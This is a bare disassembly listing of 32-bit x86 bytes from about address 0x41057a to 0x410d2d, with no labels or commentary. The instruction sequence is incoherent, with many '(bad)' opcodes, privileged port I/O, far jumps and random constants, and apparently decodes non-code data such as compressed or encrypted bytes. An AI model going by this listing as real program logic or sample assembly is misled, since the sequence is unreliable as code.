  41057a:	mov    ds:0xb7b4fd87,al
  41057f:	push   ss
  410580:	in     al,dx
  410581:	jge    0x410588
  410583:	ss jbe 0x4105aa
  410586:	mov    cl,BYTE PTR [eax-0x3d]
  410589:	enter  0xb520,0x95
  41058d:	and    eax,0xd53b0c3a
  410592:	inc    esp
  410593:	pop    ebx
  410594:	adc    eax,0x17a2b1df
  410599:	leave  
  41059a:	div    BYTE PTR [ecx+0x1339b115]
  4105a0:	popa   
  4105a1:	arpl   WORD PTR [ecx],bx
  4105a3:	shl    DWORD PTR [edi],cl
  4105a5:	fisttp QWORD PTR [esi]
  4105a7:	xor    BYTE PTR [ecx+eiz*8+0x4a],al
  4105ab:	jnp    0x410602
  4105ad:	add    ch,BYTE PTR [esi+0x4d]
  4105b0:	inc    ebp
  4105b1:	dec    esp
  4105b2:	sbb    eax,0xa6973f9d
  4105b7:	add    al,0x22
  4105b9:	or     eax,esp
  4105bb:	mov    bl,0xa6
  4105bd:	mov    ebx,0xd370fdbb
  4105c2:	or     BYTE PTR [ebx+0x236168cd],bl
  4105c8:	not    DWORD PTR [eax-0x77]
  4105cb:	loopne 0x410612
  4105cd:	mov    edi,edi
  4105cf:	scas   eax,DWORD PTR es:[edi]
  4105d0:	out    0x96,eax
  4105d2:	js     0x4105a4
  4105d4:	fcomp  DWORD PTR [eax]
  4105d6:	cmp    dh,BYTE PTR [ecx]
  4105d8:	mov    ax,ds:0x292ec26a
  4105de:	add    al,0x66
  4105e0:	xor    cl,BYTE PTR ds:0xb7f5ccee
  4105e6:	dec    edx
  4105e7:	jnp    0x4105cc
  4105e9:	sar    BYTE PTR [ecx+0x12033336],cl
  4105ef:	test   DWORD PTR [esp+eax*4-0xc],ebx
  4105f3:	dec    eax
  4105f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105f5:	xor    eax,0xd02f2ebb
  4105fa:	pop    esi
  4105fb:	es aas 
  4105fd:	lods   al,BYTE PTR ds:[esi]
  4105fe:	jp     0x41058f
  410600:	mov    ds:0xcc99ab02,al
  410605:	xchg   ebx,eax
  410606:	mov    bl,0x9f
  410608:	dec    esp
  410609:	jmp    0xc16f98e5
  41060e:	pop    edi
  41060f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410610:	popf   
  410611:	adc    ch,BYTE PTR [edi-0x65]
  410614:	mov    al,0xd4
  410616:	push   0xffffff98
  410618:	mov    ebp,0xff63357f
  41061d:	stos   BYTE PTR es:[edi],al
  41061e:	inc    eax
  41061f:	mov    BYTE PTR [ebx],bl
  410621:	ss enter 0x5b7c,0x69
  410626:	mov    bl,dh
  410628:	cmp    esp,DWORD PTR [edx-0x30]
  41062b:	les    ebx,FWORD PTR fs:[esp+ebx*1-0x4]
  410630:	mov    al,0xb6
  410632:	jns    0x41067c
  410634:	jp     0x4105f4
  410636:	cmp    al,0x26
  410638:	dec    ebp
  410639:	mov    esp,0x6ca72afb
  41063e:	xchg   BYTE PTR [ecx-0xf],bl
  410641:	sbb    al,0xf5
  410643:	dec    ebx
  410644:	jne    0xe410a527
  41064a:	les    ebp,FWORD PTR [edx+eiz*1]
  41064d:	push   eax
  41064e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41064f:	jo     0x41063a
  410651:	sub    DWORD PTR [edx],eax
  410653:	daa    
  410654:	ins    BYTE PTR es:[edi],dx
  410655:	add    al,0x30
  410657:	mov    ss,WORD PTR [edi+0x5ef02afe]
  41065d:	adc    eax,0x46dea7d4
  410662:	js     0x410653
  410664:	test   DWORD PTR [esi],0x2bd39b86
  41066a:	movntq QWORD PTR [esi+0x5f],mm4
  41066e:	scas   eax,DWORD PTR es:[edi]
  41066f:	xchg   ebp,eax
  410670:	sar    BYTE PTR [ebx+0x5d],1
  410673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410674:	xor    BYTE PTR [edi+0x85bd2c2],0xd2
  41067b:	mov    esi,0xad39e685
  410680:	mov    ah,0xb2
  410682:	ds out dx,al
  410684:	hlt    
  410685:	std    
  410686:	lahf   
  410687:	xor    eax,0xc385f086
  41068c:	iret   
  41068d:	lahf   
  41068e:	sahf   
  41068f:	ss scas eax,DWORD PTR es:[edi]
  410691:	add    edx,DWORD PTR [ebx+esi*8-0x603dce3d]
  410698:	loop   0x4106ca
  41069a:	inc    ebx
  41069b:	sti    
  41069c:	xor    DWORD PTR [ecx-0x4702844b],edi
  4106a2:	mov    dh,0x82
  4106a4:	jg     0x410706
  4106a6:	adc    esp,esi
  4106a8:	call   0xf2df:0x5cd05ba0
  4106af:	jbe    0x4106c3
  4106b1:	fcomp  QWORD PTR [eax-0x3c]
  4106b4:	aad    0x6f
  4106b6:	jo     0x410711
  4106b8:	pop    edx
  4106b9:	mov    esp,0x1364b4b8
  4106be:	daa    
  4106bf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106c1:	cld    
  4106c2:	sub    BYTE PTR [edx-0xce21a70],dh
  4106c8:	sub    DWORD PTR [esi-0x4c],ecx
  4106cb:	pop    ebx
  4106cc:	retf   0x856b
  4106cf:	dec    ecx
  4106d0:	out    dx,eax
  4106d1:	repz cmp ch,BYTE PTR cs:[ecx-0x63]
  4106d6:	test   esi,edx
  4106d8:	sbb    BYTE PTR [eax+esi*8-0x3d469d53],al
  4106df:	(bad)
  4106e2:	call   0xa01d:0xccfdba83
  4106e9:	adc    dl,BYTE PTR [ebx+0x16d67134]
  4106ef:	dec    ecx
  4106f0:	mov    eax,ds:0x24ba97f8
  4106f5:	adc    esi,eax
  4106f7:	inc    ebp
  4106f8:	xchg   ebx,eax
  4106f9:	out    0xbe,al
  4106fb:	sbb    BYTE PTR [edx-0xd1bd4a8],dh
  410701:	test   BYTE PTR [esi],ch
  410703:	mov    DWORD PTR [edx],esp
  410705:	dec    ecx
  410706:	push   edx
  410707:	call   0xd233:0xeee5e7a4
  41070e:	nop
  41070f:	cmp    al,0x20
  410711:	les    edx,FWORD PTR [edx]
  410713:	pop    ebp
  410714:	pop    ds
  410715:	(bad)  
  410717:	pusha  
  410718:	int    0xae
  41071a:	add    ah,bl
  41071c:	jge    0x41076d
  41071e:	dec    ecx
  41071f:	mov    eax,gs
  410721:	jmp    0x410745
  410723:	pop    ss
  410724:	pop    esi
  410725:	pusha  
  410726:	jns    0x410716
  410728:	push   edi
  410729:	mov    bl,0x9c
  41072b:	xlat   BYTE PTR ds:[ebx]
  41072c:	cmp    eax,0x4135042e
  410731:	cdq    
  410732:	iret   
  410733:	ror    al,0x8b
  410736:	not    cl
  410738:	push   ss
  410739:	pop    eax
  41073a:	lock xchg edx,eax
  41073c:	and    eax,0x8f0eb230
  410741:	fisttp DWORD PTR [esi+0xe79620d]
  410747:	out    0x80,eax
  410749:	sub    eax,0x455f5f24
  41074e:	hlt    
  41074f:	xchg   edi,eax
  410750:	pop    DWORD PTR [ebp+0x570a2051]
  410756:	or     ecx,esi
  410758:	gs jno 0x410760
  41075b:	xchg   DWORD PTR [edx+0x577971fa],edx
  410761:	(bad)  
  410763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410764:	xor    al,ah
  410766:	rcr    BYTE PTR [eax+0x69f62f7d],1
  41076c:	and    BYTE PTR [eax],al
  41076e:	ror    DWORD PTR [ecx+eiz*8-0x52bf2a53],cl
  410775:	cmp    DWORD PTR [ecx-0x3a],edi
  410778:	pop    ebx
  410779:	sub    ecx,DWORD PTR [ebx-0xf]
  41077c:	cdq    
  41077d:	sbb    bh,BYTE PTR [edx+0x484bed65]
  410783:	je     0x41072d
  410785:	leave  
  410786:	(bad)
  410789:	lods   al,BYTE PTR ds:[esi]
  41078a:	mov    WORD PTR [ebx],?
  41078c:	jae    0x410770
  41078e:	pusha  
  41078f:	push   edx
  410790:	dec    edi
  410791:	mov    dl,0x6b
  410793:	xchg   BYTE PTR [esi+0x5b],bh
  410796:	jno    0x41080c
  410798:	fst    QWORD PTR [ebx]
  41079a:	push   esp
  41079b:	enter  0x8ed,0xf6
  41079f:	in     al,0x4d
  4107a1:	das    
  4107a2:	jb     0x41075b
  4107a4:	sbb    cl,BYTE PTR [esi]
  4107a6:	jb     0x4107cf
  4107a8:	cwde   
  4107a9:	pop    edi
  4107aa:	jb     0x410800
  4107ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ad:	jno    0x41081c
  4107af:	xor    eax,0xb93c6811
  4107b4:	xlat   BYTE PTR ds:[ebx]
  4107b5:	fnstsw WORD PTR [eax]
  4107b7:	cwde   
  4107b8:	sub    al,BYTE PTR [edi-0x28]
  4107bb:	test   ebx,ebp
  4107bd:	aam    0x8a
  4107bf:	mov    es,edi
  4107c1:	inc    ebp
  4107c2:	jmp    0x4107e7
  4107c4:	pop    esi
  4107c5:	jl     0x4107ca
  4107c7:	jge    0x41077d
  4107c9:	mov    al,0x14
  4107cb:	imul   edx,DWORD PTR [edi-0x40c94ae6],0x36
  4107d2:	jns    0x410852
  4107d4:	mov    al,ds:0x1b215cb
  4107d9:	into   
  4107da:	and    BYTE PTR ds:0x12a7a52,cl
  4107e0:	fwait
  4107e1:	retf   0xaeab
  4107e4:	mov    ds:0xdb6b78d9,al
  4107e9:	mov    edi,0xaf42489d
  4107ee:	not    DWORD PTR [eax-0x1a0d6b4c]
  4107f4:	xor    bl,bh
  4107f6:	and    eax,0x8a23cab4
  4107fb:	push   esp
  4107fc:	sub    al,0xfd
  4107fe:	fnstcw WORD PTR [edi]
  410800:	inc    ecx
  410801:	fimul  DWORD PTR [ebp+0x74]
  410804:	pop    ebp
  410805:	jb     0x41080b
  410807:	and    eax,0x4415dd55
  41080c:	iret   
  41080d:	fcom   st(4)
  41080f:	jne    0x4107fb
  410811:	(bad)  
  410812:	repz xchg ecx,eax
  410814:	pop    eax
  410815:	inc    edi
  410816:	and    edi,DWORD PTR [eax-0x2b]
  410819:	imul   ebx,DWORD PTR [edi-0x49],0x5f32397a
  410820:	pop    eax
  410821:	add    esi,DWORD PTR es:[eax+0x40]
  410825:	sbb    al,0x75
  410827:	xor    DWORD PTR [ebx+ecx*1-0x6c],ebp
  41082b:	xchg   esp,eax
  41082c:	mov    ah,0xf
  41082e:	mov    esi,0x73167a95
  410833:	push   ecx
  410834:	test   BYTE PTR [ecx+0x6c0d06c2],bh
  41083a:	mov    bh,0xf7
  41083c:	shl    DWORD PTR [edi-0x59],1
  41083f:	lea    edx,[edx-0x19]
  410842:	dec    ebx
  410843:	je     0x410876
  410845:	adc    BYTE PTR [edi+ebp*2+0x61b4a4b],0x51
  41084d:	xchg   esi,eax
  41084e:	sub    al,0x5f
  410850:	sub    eax,0xaf3c56f0
  410855:	mov    dl,0xf7
  410857:	mov    ah,0x26
  410859:	sahf   
  41085a:	xchg   edx,eax
  41085b:	shl    esp,cl
  41085d:	jns    0x4108a3
  41085f:	adc    ecx,ebx
  410861:	push   cs
  410862:	dec    edx
  410863:	fisub  WORD PTR [ebx+edx*8+0x10]
  410867:	int3   
  410868:	mov    bl,0x75
  41086a:	sbb    al,0x6d
  41086c:	mov    ah,0xce
  41086e:	add    ch,BYTE PTR [eax-0x10cfa757]
  410874:	xchg   DWORD PTR [ebp+0x38a66804],eax
  41087a:	push   edx
  41087b:	xchg   ecx,eax
  41087c:	and    esi,DWORD PTR [ebp-0x7d]
  41087f:	outs   dx,DWORD PTR ds:[esi]
  410880:	lods   al,BYTE PTR ds:[esi]
  410881:	xchg   dl,dh
  410883:	shl    bh,0xd4
  410886:	or     al,BYTE PTR [ecx+0x46]
  410889:	cld    
  41088a:	ss jo  0x4108c2
  41088d:	mov    BYTE PTR [edi-0x10af8942],bl
  410893:	lock and al,0xc6
  410896:	jne    0x410867
  410898:	jae    0x4108b6
  41089a:	adc    DWORD PTR [ebp-0x38],ebp
  41089d:	mov    edx,0x18981171
  4108a2:	mov    ecx,DWORD PTR [edx+ebp*4]
  4108a5:	dec    esp
  4108a6:	dec    ebx
  4108a7:	jmp    0x6b00:0x1416e1a
  4108ae:	test   BYTE PTR [ecx],bh
  4108b0:	arpl   WORD PTR [esi-0x79921d4d],bx
  4108b6:	(bad)  [esi-0x51]
  4108b9:	push   ecx
  4108ba:	movaps xmm0,XMMWORD PTR [edi+0x5d]
  4108be:	loope  0x41090c
  4108c0:	rcl    BYTE PTR [ecx-0x4e],0x69
  4108c4:	call   0xb195:0xf4c3f8ee
  4108cb:	enter  0xeb09,0xc8
  4108cf:	fsub   st,st(5)
  4108d1:	jbe    0x41094b
  4108d3:	xchg   esp,eax
  4108d4:	loope  0x4108d4
  4108d6:	push   edi
  4108d7:	aas    
  4108d8:	xchg   BYTE PTR [edi+0x43],ah
  4108db:	pop    edi
  4108dc:	scas   al,BYTE PTR es:[edi]
  4108dd:	jmp    0x41091f
  4108df:	adc    ebx,esi
  4108e1:	sahf   
  4108e2:	sbb    BYTE PTR [ecx],al
  4108e4:	loopne 0x4108f9
  4108e6:	xchg   edx,eax
  4108e7:	inc    esi
  4108e8:	add    dl,0xe6
  4108eb:	sub    bh,BYTE PTR [ecx-0x3f]
  4108ee:	sbb    eax,0x942f55c9
  4108f3:	sbb    eax,DWORD PTR [ecx+0x39e969c7]
  4108f9:	ins    BYTE PTR es:[edi],dx
  4108fa:	add    ebx,esi
  4108fc:	call   0x2a9fa999
  410901:	and    eax,ecx
  410903:	lods   al,BYTE PTR ds:[esi]
  410904:	xlat   BYTE PTR ds:[ebx]
  410905:	std    
  410906:	ss stc 
  410908:	scas   al,BYTE PTR es:[edi]
  410909:	iret   
  41090a:	out    0xca,al
  41090c:	cdq    
  41090d:	mov    bh,0x79
  41090f:	xchg   ebx,eax
  410910:	shl    cl,1
  410912:	sub    edx,DWORD PTR ds:0x978446d3
  410918:	and    eax,0x529b811c
  41091d:	loope  0x41095a
  41091f:	cmp    edx,DWORD PTR [edx+ebp*8-0x4b]
  410923:	adc    BYTE PTR [edx+ebp*8],dl
  410926:	jns    0x41099a
  410928:	jmp    0x41094d
  41092a:	pop    ecx
  41092c:	mov    edx,0xdc7229ab
  410931:	data16 sbb BYTE PTR [ebx+0x66],0x60
  410936:	jnp    0x410953
  410938:	call   0x4b09:0xe4eeb977
  41093f:	push   esp
  410940:	jae    0x410994
  410942:	fucom  st(2)
  410944:	cmp    dh,BYTE PTR [esi]
  410946:	in     al,0xb4
  410948:	push   esp
  410949:	mov    WORD PTR [esi],?
  41094b:	pop    ds
  41094c:	bound  ecx,QWORD PTR [esi+0x6a]
  41094f:	sbb    eax,0x3d93f67f
  410954:	mov    eax,0xa91fb162
  410959:	test   BYTE PTR [edi-0xb],cl
  41095c:	push   0x63006233
  410961:	daa    
  410962:	and    edi,ebx
  410964:	sbb    ch,BYTE PTR [ebx+0x4fd9e8dc]
  41096a:	(bad)
  41096d:	aam    0x6b
  41096f:	dec    esp
  410970:	pop    eax
  410971:	dec    ecx
  410972:	inc    ecx
  410973:	xchg   ecx,eax
  410974:	imul   eax,DWORD PTR [esi+ecx*8],0xe23817b4
  41097b:	push   esp
  41097c:	jl     0x410998
  41097e:	or     al,dh
  410980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410981:	in     al,dx
  410982:	mov    bh,0x44
  410984:	icebp  
  410985:	outs   dx,BYTE PTR ds:[esi]
  410986:	mov    ch,bh
  410988:	leave  
  410989:	push   esp
  41098a:	xchg   BYTE PTR [eax],cl
  41098c:	(bad)  
  41098d:	sbb    bl,BYTE PTR [eax]
  41098f:	adc    BYTE PTR [ecx-0x79ea9ff],bh
  410995:	inc    edx
  410996:	fsubp  st(3),st
  410998:	rcl    DWORD PTR [esi],0x71
  41099b:	xor    eax,0x908499cf
  4109a0:	inc    esp
  4109a1:	stos   BYTE PTR es:[edi],al
  4109a2:	jae    0x410945
  4109a4:	inc    ebx
  4109a5:	inc    ecx
  4109a6:	hlt    
  4109a7:	ret    0xf6de
  4109aa:	inc    esp
  4109ab:	fs ja  0x410a28
  4109ae:	aas    
  4109af:	xchg   edx,eax
  4109b0:	out    0xd6,al
  4109b2:	sub    BYTE PTR [ecx],al
  4109b4:	jmp    0x8f5660e0
  4109b9:	gs jecxz 0x41099f
  4109bc:	mov    ah,0xf2
  4109be:	stc    
  4109bf:	cld    
  4109c0:	mov    edx,0x8e9dfbaf
  4109c5:	outs   dx,BYTE PTR ds:[esi]
  4109c6:	push   eax
  4109c7:	loop   0x410a33
  4109c9:	(bad)  
  4109ca:	out    dx,eax
  4109cb:	push   esp
  4109cc:	cmp    bl,BYTE PTR [esi+0x7ccfca45]
  4109d2:	push   esi
  4109d3:	(bad)  
  4109d4:	cmc    
  4109d5:	sbb    esi,DWORD PTR [ebp+0x623bae1e]
  4109db:	pop    edx
  4109dc:	and    al,0xb3
  4109de:	dec    edi
  4109df:	or     eax,DWORD PTR [ecx+ebx*8+0x40779292]
  4109e6:	jl     0x4109c3
  4109e8:	dec    edi
  4109e9:	dec    edi
  4109ea:	test   BYTE PTR [edi-0x8],dh
  4109ed:	aam    0xda
  4109ef:	stc    
  4109f0:	xor    al,0x9f
  4109f2:	xchg   ebx,eax
  4109f3:	loop   0x410a21
  4109f5:	xchg   ebp,eax
  4109f6:	mov    ds:0x81400f6f,al
  4109fb:	add    al,0x9c
  4109fd:	cmp    eax,0x3ddb454
  410a02:	mov    al,0xb8
  410a04:	out    dx,al
  410a05:	sahf   
  410a06:	lock or BYTE PTR [ecx-0x68],dl
  410a0a:	cdq    
  410a0b:	cmp    eax,0x3117486c
  410a10:	les    ebp,FWORD PTR [eax+edi*8-0x32d81c79]
  410a17:	and    al,0xd2
  410a19:	cdq    
  410a1a:	inc    edx
  410a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a1c:	mov    al,0x5f
  410a1e:	(bad)  
  410a1f:	mov    eax,ds:0x27e86721
  410a24:	sub    ebp,DWORD PTR [eax+0x5e]
  410a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a28:	or     al,0xc
  410a2a:	dec    edx
  410a2b:	inc    eax
  410a2c:	(bad)  
  410a2d:	xchg   ebp,eax
  410a2e:	or     al,0xad
  410a30:	jecxz  0x410a9c
  410a32:	mov    ebp,0x8bbc3a66
  410a37:	and    ch,ch
  410a39:	jbe    0x410ab7
  410a3b:	push   ecx
  410a3c:	xchg   edi,eax
  410a3d:	ins    DWORD PTR es:[di],dx
  410a3f:	ins    BYTE PTR es:[edi],dx
  410a40:	mov    dl,0x22
  410a42:	push   edx
  410a43:	imul   esi,DWORD PTR [eax],0xffffff97
  410a46:	sbb    al,0xa5
  410a48:	and    bh,BYTE PTR [edx+0x248042ab]
  410a4e:	inc    ecx
  410a4f:	push   ecx
  410a50:	loope  0x410aca
  410a52:	les    edx,FWORD PTR [edi]
  410a54:	icebp  
  410a55:	arpl   dx,bx
  410a57:	out    0x32,eax
  410a59:	mov    al,ds:0xc32ceae4
  410a5e:	leave  
  410a5f:	pop    edi
  410a60:	ins    BYTE PTR es:[edi],dx
  410a61:	lock nop
  410a63:	pop    ecx
  410a64:	inc    ebp
  410a65:	shl    BYTE PTR gs:[bx+si-0x5efb],1
  410a6b:	push   esp
  410a6c:	ja     0x410a95
  410a6e:	mov    ds,WORD PTR [esi]
  410a70:	repz sub DWORD PTR [eax+0x6e],edx
  410a74:	xchg   dl,al
  410a76:	in     al,dx
  410a77:	push   ds
  410a78:	mov    WORD PTR [esi-0x36],cs
  410a7b:	mov    ah,0x25
  410a7d:	inc    ebx
  410a7e:	dec    esp
  410a7f:	xchg   ch,ch
  410a81:	fdiv   DWORD PTR [ecx+0xc]
  410a84:	lea    ebp,[ebx]
  410a86:	jbe    0x410a70
  410a88:	sbb    al,0x9c
  410a8a:	pop    es
  410a8b:	xor    edi,ebp
  410a8d:	or     edx,DWORD PTR [ecx+0x35]
  410a90:	pop    esi
  410a91:	xor    eax,0x51036f86
  410a96:	xor    al,0xce
  410a98:	bswap  esp
  410a9a:	(bad)  
  410a9c:	mov    ds:0xdd36a88d,al
  410aa1:	mov    ss:0xb33ee965,eax
  410aa7:	stos   BYTE PTR es:[edi],al
  410aa8:	popf   
  410aa9:	cmp    esi,DWORD PTR [eax]
  410aab:	(bad)  
  410aac:	mov    edx,0x6038bbf4
  410ab1:	mov    ah,0x4b
  410ab3:	add    eax,ebx
  410ab5:	repz or al,bh
  410ab8:	lods   al,BYTE PTR ds:[esi]
  410ab9:	xchg   esi,eax
  410aba:	push   ss
  410abb:	adc    eax,0xe8d0c2ef
  410ac0:	jmp    0x410a53
  410ac2:	stc    
  410ac3:	mov    edx,0x353569fe
  410ac8:	mov    bh,BYTE PTR [ebp-0x12]
  410acb:	dec    ecx
  410acc:	jle    0x410a93
  410ace:	sub    eax,0xdf00fa1a
  410ad3:	imul   esi,edx,0x2bd29c2f
  410ad9:	add    cl,BYTE PTR [edx]
  410adb:	sub    al,0x77
  410add:	je     0x410ae8
  410adf:	ins    DWORD PTR es:[edi],dx
  410ae0:	adc    BYTE PTR ds:0x76994b53,cl
  410ae6:	jb     0x410ac5
  410ae8:	mov    eax,ds:0xa3d00f02
  410aed:	rol    al,1
  410aef:	call   0x1825:0x1a8346ba
  410af6:	sbb    edi,0xdfb9a346
  410afc:	add    al,0xfc
  410afe:	data16 jl 0x410a85
  410b01:	in     eax,0xfc
  410b03:	ins    BYTE PTR es:[edi],dx
  410b04:	int    0xc4
  410b06:	cmp    DWORD PTR [edi+0x51661777],edi
  410b0c:	jge    0x410afe
  410b0e:	(bad)  
  410b0f:	outs   dx,BYTE PTR ds:[esi]
  410b10:	mov    edi,0x715f93e8
  410b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b17:	mov    ds:0xb81a1c4c,al
  410b1c:	dec    esp
  410b1d:	iret   
  410b1e:	(bad)  
  410b1f:	retf   
  410b20:	and    al,0xf
  410b22:	mov    al,ds:0xb0eaa964
  410b27:	sti    
  410b28:	mov    ah,0x56
  410b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b2b:	jns    0x410ac7
  410b2d:	fsubr  st,st(5)
  410b2f:	xchg   edx,eax
  410b30:	ins    BYTE PTR es:[edi],dx
  410b31:	push   eax
  410b32:	cmp    bl,BYTE PTR [eax-0x409aab88]
  410b38:	inc    edi
  410b39:	out    dx,al
  410b3a:	xor    eax,0xf7e3ce85
  410b3f:	jno    0x410bb3
  410b41:	and    bl,BYTE PTR cs:[ecx+0x2f6b0a3e]
  410b48:	and    eax,eax
  410b4a:	ret    0x14a1
  410b4d:	jle    0x410b7b
  410b4f:	pop    edi
  410b50:	leave  
  410b51:	or     al,0x5e
  410b53:	xor    bl,BYTE PTR [ecx-0xb]
  410b56:	mov    edx,0x59820f0c
  410b5b:	ss mov ebp,0xbbd741b5
  410b61:	push   edi
  410b62:	mov    ah,0x71
  410b64:	popa   
  410b65:	icebp  
  410b66:	lock mov al,ss:0x6c39bee2
  410b6d:	repz and eax,0x615bde59
  410b73:	out    0x3b,eax
  410b75:	jge    0x410bde
  410b77:	adc    esp,DWORD PTR [ebp-0x1]
  410b7a:	or     al,0xb3
  410b7c:	stc    
  410b7d:	loop   0x410b34
  410b7f:	pop    esi
  410b80:	aad    0x2e
  410b82:	adc    DWORD PTR [ebx+0x70816a45],edi
  410b88:	cmp    esi,DWORD PTR [edi+0x3f]
  410b8b:	pop    esp
  410b8c:	outs   dx,DWORD PTR ds:[esi]
  410b8d:	test   al,0xfe
  410b8f:	sub    eax,0x7ffd664e
  410b94:	lds    esp,FWORD PTR gs:[ecx+0xe]
  410b98:	push   esp
  410b99:	adc    BYTE PTR [eax-0x7c],0x3d
  410b9d:	mov    gs,WORD PTR [esi-0x7e]
  410ba0:	call   0xed92:0x55e5ae10
  410ba7:	int    0xfa
  410ba9:	shr    edx,1
  410bab:	iret   
  410bac:	push   0x2d84dd6d
  410bb1:	aaa    
  410bb2:	adc    BYTE PTR [ecx+edi*1],bh
  410bb5:	std    
  410bb6:	cwde   
  410bb7:	vpslld xmm1,xmm6,XMMWORD PTR [ecx-0x18bb3caf]
  410bbf:	dec    edi
  410bc0:	cmp    DWORD PTR [ebx],ebp
  410bc2:	dec    ebx
  410bc3:	mov    DWORD PTR [edx+0x59],esp
  410bc6:	mov    dl,0x88
  410bc8:	sbb    al,0x62
  410bca:	ins    BYTE PTR es:[edi],dx
  410bcb:	xor    DWORD PTR [edx],ebx
  410bcd:	scas   eax,DWORD PTR es:[edi]
  410bce:	mov    bl,0x87
  410bd0:	xor    ebx,DWORD PTR [edi-0x3c]
  410bd3:	mov    cl,0x35
  410bd5:	xor    DWORD PTR [edx-0x32],edx
  410bd8:	pop    esi
  410bd9:	cmp    ebp,DWORD PTR [ebx-0x62]
  410bdc:	adc    DWORD PTR [edi-0x72718969],edx
  410be2:	iret   
  410be3:	pop    ebp
  410be4:	mov    dl,0x99
  410be6:	mov    ebp,0x644c21dd
  410beb:	ins    BYTE PTR es:[edi],dx
  410bec:	or     DWORD PTR [edi-0x59],esp
  410bef:	xchg   esi,eax
  410bf0:	jb     0x410c50
  410bf2:	in     al,dx
  410bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf4:	cmp    BYTE PTR [edi],al
  410bf6:	repnz pop ebx
  410bf8:	(bad)
  410bfd:	enter  0xb6f,0x9a
  410c01:	into   
  410c02:	cmp    BYTE PTR [edx-0xa42dca8],al
  410c08:	pop    esp
  410c09:	(bad)  
  410c0a:	jmp    0x4747464f
  410c0f:	sbb    BYTE PTR [edx-0x22d81a50],dh
  410c15:	aas    
  410c16:	xchg   edi,eax
  410c17:	ret    0xdaf3
  410c1a:	aad    0x17
  410c1c:	sub    dl,BYTE PTR [ebx-0x6e]
  410c1f:	ja     0x410ba4
  410c21:	and    DWORD PTR [ebx],edi
  410c23:	jmp    0xebe5:0x35ca99ef
  410c2a:	ror    BYTE PTR [edi],cl
  410c2c:	test   al,0x82
  410c2e:	pop    edx
  410c2f:	movntq QWORD PTR [edi],mm7
  410c32:	dec    ecx
  410c33:	mov    edi,0x64a13875
  410c38:	stos   DWORD PTR es:[edi],eax
  410c39:	data16 and bl,BYTE PTR [edx]
  410c3c:	mov    ebp,0x88a62fb2
  410c41:	(bad)  
  410c43:	int    0x60
  410c45:	add    eax,0xf998e675
  410c4a:	test   eax,0x37f8d5cb
  410c4f:	pushf  
  410c50:	adc    eax,0xde6a6a9e
  410c55:	adc    eax,0xa3f63120
  410c5a:	mov    ecx,0xaf763cfd
  410c5f:	outs   dx,DWORD PTR ds:[esi]
  410c60:	sub    al,0x45
  410c62:	int3   
  410c63:	inc    ebp
  410c64:	ins    DWORD PTR es:[edi],dx
  410c65:	push   0x84e50966
  410c6a:	push   eax
  410c6b:	cld    
  410c6c:	loop   0x410ced
  410c6e:	or     cl,BYTE PTR [edx-0x55]
  410c71:	adc    eax,0x1fdf444a
  410c76:	sahf   
  410c77:	test   DWORD PTR [ebp+0x67d512ec],esi
  410c7d:	mov    esi,0x6a12678
  410c82:	loop   0x410c87
  410c84:	xchg   esi,eax
  410c85:	lock out 0x4a,al
  410c88:	and    DWORD PTR [ebx],ebx
  410c8a:	xchg   esp,eax
  410c8b:	inc    ebx
  410c8c:	push   ss
  410c8d:	pusha  
  410c8e:	sub    al,0x86
  410c90:	enter  0x6d68,0x5e
  410c94:	test   BYTE PTR [edx-0x185e933b],dh
  410c9a:	scas   al,BYTE PTR es:[edi]
  410c9b:	aas    
  410c9c:	mov    al,BYTE PTR [ebp-0x56]
  410c9f:	pop    es
  410ca0:	xchg   ebp,eax
  410ca1:	dec    esi
  410ca2:	jle    0x410cce
  410ca4:	in     al,dx
  410ca5:	retf   
  410ca6:	inc    edi
  410ca7:	dec    eax
  410ca8:	push   es
  410ca9:	mov    edi,0xb89ff1b
  410cae:	cli    
  410caf:	xchg   ebx,eax
  410cb0:	cmp    edi,ecx
  410cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb3:	add    al,0xd6
  410cb5:	or     edx,edx
  410cb7:	sbb    bl,dl
  410cb9:	iret   
  410cba:	cmp    bh,BYTE PTR [eax-0x68e9f76]
  410cc0:	mov    ds:0x21d1069a,eax
  410cc5:	jecxz  0x410c66
  410cc7:	fiadd  WORD PTR [edx]
  410cc9:	mov    al,0x9a
  410ccb:	shl    DWORD PTR [ecx+0x2c503c83],0x29
  410cd2:	sbb    ah,dl
  410cd4:	inc    esp
  410cd5:	lock ins BYTE PTR es:[edi],dx
  410cd7:	xlat   BYTE PTR ds:[ebx]
  410cd8:	dec    edi
  410cd9:	shr    BYTE PTR [esi+0x6],0xfd
  410cdd:	xchg   ebp,eax
  410cde:	mov    WORD PTR [eax-0x34ad4ff9],fs
  410ce4:	hlt    
  410ce5:	or     DWORD PTR [edx+ecx*2+0x33fede5],edi
  410cec:	sub    eax,0xdf38a0dd
  410cf1:	imul   esi,DWORD PTR [edx-0x493901c5],0x85388fe5
  410cfb:	sbb    al,BYTE PTR [ecx+0x37]
  410cfe:	ja     0x410d3f
  410d00:	inc    ecx
  410d01:	pop    ds
  410d02:	fwait
  410d03:	in     al,dx
  410d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d05:	test   DWORD PTR [ecx+0x11ef3601],esi
  410d0b:	sbb    DWORD PTR [edi-0x5acc980a],edx
  410d11:	mov    dh,0x3
  410d13:	shl    BYTE PTR [edi-0x370af11d],1
  410d19:	xchg   edx,eax
  410d1a:	jno    0x410caf
  410d1c:	fcmovu st,st(5)
  410d1e:	mov    DWORD PTR [eax-0x4a88600],esp
  410d24:	adc    ebp,DWORD PTR [edi]
  410d26:	dec    ecx
  410d27:	pop    edx
  410d28:	mov    esi,0xc616f1cc
  410d2d:	into   
